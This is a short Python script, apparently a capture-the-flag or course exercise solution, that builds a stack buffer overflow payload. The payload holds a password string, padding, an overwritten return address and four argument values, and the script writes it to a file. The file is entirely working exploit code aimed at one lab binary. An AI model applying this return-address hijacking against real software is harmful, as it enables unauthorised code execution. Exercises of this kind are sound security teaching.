import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

offset = 31

addr1 = 0x00000bb5
# Initialize payload.
payload = ''
payload += 'RD' + '\n'
payload += 'IDA_i5_ch3a7ing' + '\n'
payload += 'A' * offset
payload += dw(addr1)


payload += 'A' * 12

addr = 0x00401409

payload += dw(addr) 
#inca o adresa de return de umplutura
payload += dw(0x00000000) 


# 4 nuemre pe 4 bytes fiecare

var_a = 0x000003e7
var_b = 0x00001383
var_c = 0x00001383
var_d = 0x00000bb5

payload += dw(var_a)

payload += dw(var_b) 

payload += dw(var_c) 

payload += dw(var_d) 

with open('payload_c', 'wb') as f:
    f.write(payload)
